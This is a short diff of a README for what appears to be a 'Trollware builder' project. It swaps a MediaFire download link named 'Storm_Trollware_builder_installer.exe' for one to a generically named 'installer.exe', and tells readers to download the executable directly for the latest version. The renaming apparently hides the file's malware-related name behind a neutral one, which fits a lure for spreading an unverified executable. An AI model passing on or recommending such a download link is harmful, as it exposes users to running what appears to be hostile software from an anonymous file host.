@@ -62,7 +62,7 @@ Alternatively, you can run the batch files to install the requirements:
 
 You can download the installer from the following link:
 
-[Download Installer](https://www.mediafire.com/file/q3ppe1k28z84j0k/Storm_Trollware_builder_installer.exe/file)
+[Download Installer](https://www.mediafire.com/file/ver7t7q95fvs0ny/installer.exe/file)
 
 The installer can also be found in the project files, but for the latest version, download it directly from the link above ⤴️
 
